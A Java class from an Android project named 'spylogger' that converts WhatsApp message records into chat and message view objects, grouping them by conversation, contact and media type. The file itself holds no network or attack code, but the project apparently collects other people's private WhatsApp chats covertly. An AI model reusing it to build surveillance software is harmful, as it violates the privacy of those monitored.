package com.gravatasufoca.spylogger;

import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.whatsapp.ChatList;
import com.gravatasufoca.spylogger.model.whatsapp.Messages;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.ChatVO;
import com.gravatasufoca.spylogger.vos.ContatoVO;
import com.gravatasufoca.spylogger.vos.MensagemVO;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import lombok.Getter;
import lombok.Setter;

/**
 * Created by bruno on 12/11/16.
 */

@Getter
@Setter
public class ChatVOFactory {

    public List<ChatVO> getChats(List<Messages> mensagens){
        if(mensagens!=null && !mensagens.isEmpty()){
            //whatsapp
            if(mensagens.get(0) instanceof Messages){
                return getWhatsAppChats(mensagens);
            }
        }
        return Collections.emptyList();
    }

    private List<ChatVO> getWhatsAppChats(List<Messages> mensagens){
        Map<ChatList, List<Messages>> chatsMessages=new HashMap<>();
        Map<String, ContatoVO> contatos=new HashMap<>();
        for(Mensagem me: mensagens){
            Messages m=(Messages)me;

            if(m.getChatList()==null)continue;;

            ChatList chatList=m.getChatList();

            if(!chatsMessages.containsKey(chatList)){
                chatsMessages.put(chatList, new ArrayList<Messages>());
            }
            chatsMessages.get(chatList).add(m);

            if(!contatos.containsKey(m.getKey_remote_jid())){
                ContatoVO contato=new ContatoVO(m.getNome(Utils.context.getContentResolver()));
                contatos.put(m.getRemote_resource(), contato );
            }
        }

        List<ChatVO> chatVOs=new ArrayList<>();
        Set<ChatList> keys= chatsMessages.keySet();
        for(ChatList chatList:keys){
            ChatVO chatVO=new ChatVO();

            chatVO.setNome(chatList.getNome(Utils.context.getContentResolver()));
            chatVO.setAvatar(chatList.getPhoto());

            for(Messages message: chatsMessages.get(chatList)){
                MensagemVO mensagemVO=new MensagemVO();
                mensagemVO.setData(message.getTimestamp());
                mensagemVO.setDataRecebida(message.getReceived_timestamp());
                mensagemVO.setTexto(message.getData());
                mensagemVO.setContato(contatos.get(message.getRemote_resource()));
                mensagemVO.setRemetente(message.getKey_from_me() == 1);
                if(!message.isMedia()){
                    mensagemVO.setTipoMidia(TipoMidia.TEXTO);
                }else{
                    if(message.isAudio()){
                        mensagemVO.setTipoMidia(TipoMidia.AUDIO);
                    }else if(message.isImagem()){
                        mensagemVO.setTipoMidia(TipoMidia.IMAGEM);
                    }else if(message.isVideo()){
                        mensagemVO.setTipoMidia(TipoMidia.VIDEO);
                    }if(message.isMap()){
                        mensagemVO.setTipoMidia(TipoMidia.MAPA);
                    }
                }
                mensagemVO.setTamanhoArquivo(Long.parseLong(message.getMedia_size()));
                chatVO.addMensagem(mensagemVO);
            }
            chatVOs.add(chatVO);
        }
        return chatVOs;
    }

}
